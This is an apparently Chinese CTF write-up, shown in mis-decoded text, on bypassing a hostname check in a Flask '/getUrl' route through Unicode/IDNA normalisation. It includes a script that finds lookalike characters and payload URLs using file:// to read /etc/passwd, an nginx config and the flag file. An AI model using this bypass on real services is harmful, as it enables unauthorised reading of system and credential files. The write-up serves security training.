### Unicdoe ç¼–ç ç»•è¿‡

è¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šé¢˜ï¼ˆBUUCTFï¼‰

![](https://pic1.imgdb.cn/item/67d7d73088c538a9b5bfe462.png)

æ‰“å¼€ç½‘é¡µç»™å‡ºäº†æºä»£ç 

```python
@app.route('/getUrl', methods=['GET', 'POST'])

def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "æˆ‘æ‰Œ your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "æˆ‘æ‰Œ your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    # å»æ‰ url ä¸­çš„ç©ºæ ¼
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "æˆ‘æ‰Œ your problem? 333"
```

åˆ©ç”¨ç‚¹åœ¨è¿™é‡Œ `urllib.request.urlopen(finalUrl).read()`ï¼Œåªè¦å‰ä¸¤æ¬¡ `host != suctf.cc`ï¼Œç¬¬ä¸‰æ¬¡ `host == suctf.cc` å³å¯

è€Œè¿™åˆ©ç”¨çš„å…³é”®åœ¨äº `newhost.append(h.encode('idna').decode('utf-8'))` ç¼–ç é—®é¢˜ï¼Œ`Unicode` çš„å¾ˆå¤šå­—ç¬¦ç»è¿‡è¿™æ ·çš„ä¸€ç•ªç¼–ç å¤„ç†éƒ½å¯ä»¥å¾—åˆ°æ­£å¸¸çš„å­—æ¯

```python
chars = ['s', 'u', 'c', 't', 'f']
for c in chars:
	for i in range(0x7f, 0x10FFFF):
		try:
			char_i = chr(i).encode('idna').decode('utf-8')
			if char_i == c:
				print('ASCII: {}   Unicode: {}    Number: {}'.format(c, chr(i), i))
		except:
			pass
```

![](https://pic1.imgdb.cn/item/67d7da4a88c538a9b5bfe54f.png)

ä»»æ„å»ä¸€ä¸ªæ›¿æ¢ `['s', 'u', 'c', 't', 'f']` å…¶ä¸­ä¸€ä¸ªå³å¯ç»•è¿‡

```python
/getUrl?url=file://ğ‘†uctf.cc/etc/passwd
```

![](https://pic1.imgdb.cn/item/67d7da7f88c538a9b5bfe560.png)

ç„¶åæ˜¯æ‰¾ flag ä½ç½®ï¼Œåœ¨ `Nginx` çš„é…ç½®æ–‡ä»¶ä¸­

```python
/getUrl?url=file://ğ‘†uctf.cc/usr/local/nginx/conf/nginx.conf
```

![](https://pic1.imgdb.cn/item/67d7daac88c538a9b5bfe56e.png)

```python
/getUrl?url=file://ğ‘†uctf.cc/usr/fffffflag
```

![](https://pic1.imgdb.cn/item/67d7dac788c538a9b5bfe573.png)